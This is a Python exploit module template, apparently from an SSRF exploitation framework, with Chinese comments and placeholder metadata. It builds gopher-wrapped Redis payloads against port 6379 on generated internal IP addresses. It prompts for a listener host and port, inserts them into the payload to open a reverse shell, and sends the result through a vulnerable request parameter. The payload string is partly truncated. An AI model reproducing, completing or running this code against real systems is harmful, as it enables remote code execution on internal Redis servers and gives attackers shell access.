import logging

from core.utils import *

name = "servicename in lowercase"
description = "ServiceName 远程代码执行 - 功能说明"
author = "作者姓名或昵称"
documentation = ["http://link_to_a_research", "http://another_link"]


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 处理反弹 shell 参数
        if args.lhost == None:
            self.SERVER_HOST = input("服务器主机:")
        else:
            self.SERVER_HOST = args.lhost

        if args.lport == None:
            self.SERVER_PORT = input("服务器端口:")
        else:
            self.SERVER_PORT = args.lport

        # 使用生成器创建主机列表
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            # 服务的数据和端口
            port = "6379"
            data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
            payload = wrapper_gopher(data, ip, port)

            # 处理反弹 shell 参数
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # 发送 payload
            r = requester.do_request(args.param, payload)
